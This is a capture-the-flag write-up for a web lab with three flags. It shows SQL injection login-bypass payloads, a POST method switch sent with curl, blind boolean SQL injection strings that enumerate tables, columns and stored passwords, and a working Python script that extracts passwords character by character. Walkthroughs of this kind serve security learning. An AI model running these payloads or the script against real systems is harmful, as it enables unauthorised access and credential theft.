# Flag0
Firstly, I have to login before doing anything. A login form has appeard and SQL Injection is the first I got in my mind.
```
username: admin'or/**/1=1--+-
password: 1
```
We got an error
```
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1")
```
--> This application is using `SQL` and `MariaDB` 
I have tried a lot with `or` and `1=1` but it seems a wrong way.
Look at the query, I think it doesn't response anything, so I use `union` to bypass this thing
```
// Replace `--+-` to `#` 
username: admin' union select '1' as password #
password: 1
```
And the frist flag in private page
```
Flag is : ^FLAG^d0e601294c1ecc7f76fd8185b5a49178d6b7616a68e33d4bcde1d9c7ecbe079c$FLAG$
```
# Flag1
Secondly, I got a hint `Just because request fails with one method doesn't mean it will fail with a different method`. After that, I use BurpSutie to intercept the request and change method from `GET` to `POST`, but I always receive `BAD REQUEST The browser (or proxy) sent a request that this server could not understand.` 😶
Okay fine, I decide to use `curl` tool in Kali for this purpose.
```
curl -v -X POST http://35.190.155.168/2ef1ae5437/page/edit/2
```
```
Flag is : ^FLAG^09c2a73b2205519aa65ff713904d07024f36b1c4ce0bfaab7d25b567aa1596c9$FLAG$
```
# Flag2
Finally, I got final hint `Credentials are secret, flags are secret. Coincidence?`. This credentials are mentioned might be the password of someone else in database. So, back to login page and SQLi to find the password.

You can use `sqlmap` to automaticly brute force, but I'll code in Python or use Burp Suite to understand what I am doing

```
username: admin' union select if(substr((select database() from information_schema.tables where table_name=),1,1)='a','1',0) as password #
password: 1
```
I got an error, `level2` may be the database's name
```
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1146, "Table 'level2.information_schema' doesn't exist")
```
Use Burp Suite to intercept password and send it to `Repeater`
- Payload is [a-zA-z0-9]
- Flag is `Invalid password`
```
username: admin' union select if(substr((select group_concat(table_name,',') from information_schema.tables where talbe_type='base table'),1,1)='a','1',0) as password #
password: 1
```
--> The table'name I got is `admins`

Next, I brute froce column name
```
username: admin' union select if(substr((select group_concat(column_name,',') from information_schema.columns where table_name='admins'),1,1)='a','1',0) as password #
password: 1
```
--> `id, username, password`

And brute force the password
```
username: admin' union select if(substr((select group_concat(password,'|') from admins),1,1)='a','1',0) as password #
password: 1
```
--> `sally`

Login with the following credentials and get the flag
```
Flag is : ^FLAG^f0d9708f40a0406ac7f4ebda750603ecc333a3e375f20cc1124dd8167e7adfb7$FLAG$
```

Sorry for my shilly code 😅 Just a draft
```python
import string
import requests

URL = "http://35.190.155.168/2ef1ae5437/login"
TRUE_PHRASE = 'Invalid password'

def query(body):
    # cookies = {'PHPSESSID': PHPSESSID}
    r = requests.post(URL, data=body)
    return TRUE_PHRASE not in r.text

def findColumnName():
    column = ''
    i = 1
    while True:
        for character in string.printable:
            body = {'username': "admin' union select if(substr((select group_concat(column_name,',') from information_schema.columns where table_name='admins'),{0},1)='{1}','1',0) as password #".format(i, character),'password': '1'}
            if query(body) is True:
                column += character
                print(column)
                break
        i += 1


def findPassword():
    column = ''
    i = 1
    while True:
        for character in string.printable:
            body = {'username': "admin' union select if(substr((select group_concat(password,'|') from admins),{0},1)='{1}','1',0) as password #".format(i, character),'password': '1'}
            if query(body) is True:
                column += character
                print(column)
                break
        i += 1
# findColumnName()
findPassword()
```
